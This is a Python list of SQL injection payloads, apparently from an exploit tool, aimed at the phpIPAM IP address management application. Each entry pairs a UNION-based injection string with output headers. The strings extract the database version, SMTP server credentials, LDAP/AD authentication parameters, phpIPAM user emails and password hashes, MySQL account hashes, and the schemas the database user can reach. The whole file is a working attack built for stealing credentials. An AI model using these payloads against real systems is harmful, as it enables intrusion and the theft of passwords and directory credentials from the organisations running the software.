simple_payloads = [

    {
        "name": "Basic Server Info",
        "description": "Extracting current user, current DB and Mysql/MariaDB version",
        "sqli": '" union select user(), NULL, database(), version()-- -',
        "tabulate_headers": ["user", "database", "version"]
    },
    {
        "name": "PHPIpam SMTP Settings",
        "description": "Getting SMTP settings if set",
        "sqli": '" union select concat(mserver, 0x3A, mport), NULL, muser, mpass from settingsMail-- -',
        "tabulate_headers": ["server:port", "smtp_user", "smtp_password"]
    },
    {
        "name": "Authentication Methods",
        "description": "Checking interesting Authentication method like LDAP/AD",
        "sqli": '" union select params, NULL, NULL, NULL from usersAuthMethod where type not in (\'local\', \'http\')-- -',
        "tabulate_headers": ["raw_json_params", "", ""]
    },
    {
        "name": "PHPIpam Users and hashes",
        "description": "Getting Other PHPIPAM users format: email::username::password and additional information",
        "sqli": '" union select concat(email, 0x3A, 0x3A, username, 0x3A, 0x3A, password), NULL, if(authMethod=1, \'mysql_user\', \'other-auth-methods\'), if(domainUser=1, \'Domain user\', \'local_db_user\') from users-- -',
        "tabulate_headers": ["email_username_password", "authMethod", "domainUser"]
    },
    {
        "name": "MySQL db Users",
        "description": "Trying to extact users and hashed password from mysql.user tables if possible",
        "sqli": '" union select mysql.user.user, NULL, mysql.user.host, mysql.user.password from mysql.user-- -',
        "tabulate_headers": ["user", "host", "password"]
    },
    {
        "name": "Other schemas availables",
        "description": "Trying to extact other schemas the current user has access if possible",
        "sqli": '" union select group_concat(information_schema.schemata.schema_name), NULL, NULL, NULL from information_schema.schemata where information_schema.schemata.schema_name not in ("information_schema", "sys", "mysql", "performance_schema")-- -',
        "tabulate_headers": ["schema_list", "", ""]
    }
]
